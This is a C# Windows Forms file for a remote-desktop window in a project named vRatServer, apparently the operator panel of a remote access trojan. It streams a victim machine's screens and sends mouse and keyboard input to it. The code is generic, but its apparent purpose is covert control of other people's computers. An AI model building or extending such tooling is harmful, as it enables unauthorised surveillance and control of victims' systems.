using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Forms
{
    public partial class RemoteDesktop : Form
    {
        Client client;
        bool mouse = false;
        bool keyb = false;
        public RemoteDesktop(Client client)
        {
            this.client = client;
            InitializeComponent();
        }

        private void RemoteDesktop_Resize(object sender, EventArgs e)
        {
            int centerX = this.ClientSize.Width / 2;



            int controlWidth = panel1.Width;


            
            int newControlX = centerX - controlWidth / 2;
            panel1.Location = new Point(newControlX, 0);
        }

        private void RemoteDesktop_Load(object sender, EventArgs e)
        {
            Showbtn.Location = new Point(400, 0);
            Showbtn.Left = (this.Width / 2) - (Showbtn.Width / 2);
            foreach (string sc in client.screens)
            {
                comboBox1.Items.Add(sc);
                comboBox1.SelectedItem = sc;
            }

             client.cf = this;
             client.cf.pictureBox1 = pictureBox1;
           

        }

        private void RemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
        {
            byte[]? r = null;
            client.cf = null;
            globals.SendPacket(client, (byte)globals.PacketType.rdpStop, 0, 0, ref r);
        }

        private void Startbtn_Click(object sender, EventArgs e)
        {
            
            byte[] mon = Encoding.Unicode.GetBytes(comboBox1.SelectedItem.ToString());
            byte[] data_buffer = mon.Concat(new byte[] { 0x00, 0x00 }).ToArray();


            globals.SendPacket(client, (byte)globals.PacketType.rdpStart, mon.Length+2, 0, ref data_buffer);
            Startbtn.Enabled = false;
            Stopbtn.Enabled = true;
        }

        private void Stopbtn_Click(object sender, EventArgs e)
        {
            byte[]? r = null;
            globals.SendPacket(client, (byte)globals.PacketType.rdpStop, 0, 0, ref r);
            Startbtn.Enabled = true;
            Stopbtn.Enabled = false;

        }

        private void Showbtn_Click(object sender, EventArgs e)
        {
            panel1.Visible = true;
            Showbtn.Visible = false;
            Hidebtn.Visible = true;


        }

        private void Hidebtn_Click(object sender, EventArgs e)
        {
            Hidebtn.Visible = false;
            Showbtn.Visible = true;
            panel1.Visible = false;
        }

        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {

            if (!mouse) { return; }
            int flag = 0x02;
            if (e.Button == System.Windows.Forms.MouseButtons.Right) { flag = 0x0008; }
            else if (e.Button == System.Windows.Forms.MouseButtons.Left) { flag = 0x0002; }
            else if (e.Button == System.Windows.Forms.MouseButtons.Middle) { flag = 0x0020; }
            else { return; }
            Point p = new Point(e.X * client.ScreenX / pictureBox1.Width, e.Y * client.ScreenY / pictureBox1.Height);
            int xpos = p.X;
            int ypos = p.Y;

            byte[] xposb = BitConverter.GetBytes(xpos);
            byte[] yposb = BitConverter.GetBytes(ypos);

            byte[] d = BitConverter.GetBytes(flag);


            
            byte[] concatenatedArray = xposb.Concat(yposb).Concat(d).ToArray();


            
            globals.SendPacket(client, (byte)globals.PacketType.rdpMouse, 0xc, 0, ref concatenatedArray);


        }

        private void MouseOnbtn_Click(object sender, EventArgs e)
        {
            mouse = true;
            MouseOffbtn.Enabled = true;
            MouseOnbtn.Enabled = false;
        }

        private void MouseOffbtn_Click(object sender, EventArgs e)
        {
            mouse = false;
            MouseOffbtn.Enabled = false;
            MouseOnbtn.Enabled = true;
        }

        private void keybOnbtn_Click(object sender, EventArgs e)
        {
            keyb = true;
            keybOnbtn.Enabled = false;
            keyboardOffbtn.Enabled = true;
        }

        private void keyboardOffbtn_Click(object sender, EventArgs e)
        {
            keyb = false;
            keybOnbtn.Enabled = true;
            keyboardOffbtn.Enabled = false;
        }

        private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            if (!mouse) { return; }
            int flag = 0x02;
            if (e.Button == System.Windows.Forms.MouseButtons.Right) { flag = 0x0010; }
            else if (e.Button == System.Windows.Forms.MouseButtons.Left) { flag = 0x0004; }
            else if (e.Button == System.Windows.Forms.MouseButtons.Middle) { flag = 0x0040; }
            else { return; }
            Point p = new Point(e.X * client.ScreenX / pictureBox1.Width, e.Y * client.ScreenY / pictureBox1.Height);
            int xpos = p.X;
            int ypos = p.Y;

            byte[] xposb = BitConverter.GetBytes(xpos);
            byte[] yposb = BitConverter.GetBytes(ypos);

            byte[] d = BitConverter.GetBytes(flag);



            byte[] concatenatedArray = xposb.Concat(yposb).Concat(d).ToArray();



            globals.SendPacket(client, (byte)globals.PacketType.rdpMouse, 0xc, 0, ref concatenatedArray);
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {


            if (!mouse) { return; }
            Point p = new Point(e.X * client.ScreenX / pictureBox1.Width, e.Y * client.ScreenY / pictureBox1.Height);
            int xpos = p.X;
            int ypos = p.Y;
            byte[] xposb = BitConverter.GetBytes(xpos);
            byte[] yposb = BitConverter.GetBytes(ypos);

  



            byte[] concatenatedArray = xposb.Concat(yposb).ToArray();



            globals.SendPacket(client, (byte)globals.PacketType.rdpMouseHover, 8, 0, ref concatenatedArray);

        }

        private void RemoteDesktop_KeyDown(object sender, KeyEventArgs e)
        {
            if (!keyb) { return; }


            int key = ((int)e.KeyCode);
            byte[] ky = BitConverter.GetBytes(key);

            byte[] flag = new byte[] { 0x00, 0x00, 0x00, 0x00 }; //key down

            
            byte[] concatenatedArray = ky.Concat(flag).ToArray();


            globals.SendPacket(client, (byte)globals.PacketType.rdpKey, 8, 0, ref concatenatedArray);
        }

        private void RemoteDesktop_KeyUp(object sender, KeyEventArgs e)
        {
            if (!keyb) { return; }


            int key = ((int)e.KeyCode);
            byte[] ky = BitConverter.GetBytes(key);

            byte[] flag = new byte[] { 0x02, 0x00, 0x00, 0x00 }; //key down


            byte[] concatenatedArray = ky.Concat(flag).ToArray();


            globals.SendPacket(client, (byte)globals.PacketType.rdpKey, 8, 0, ref concatenatedArray);
        }
    }
}
